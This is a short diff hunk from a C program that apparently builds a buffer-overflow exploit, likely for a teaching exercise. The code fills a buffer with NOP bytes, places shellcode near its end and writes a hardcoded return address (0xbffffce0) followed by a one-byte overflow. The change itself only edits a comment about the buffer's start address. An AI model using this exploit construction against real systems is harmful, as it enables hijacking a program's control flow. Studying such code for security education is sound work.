@@ -17,7 +17,7 @@ int main(void)
   memset(instructions, '\x90', 201);
   // shellcode
   strncpy(instructions+(195-strlen(shellcode)), shellcode, strlen(shellcode));
-  // return address to pop 0xbffffce0
+  // return address to pop (beginning of buffer is 0xbffffcd0) 0xbffffce0
   strncpy(instructions+196, "\xe0\xfc\xff\xbf", 4);
   // last byte overflow
   strncpy(instructions+200, "\x90", 1);
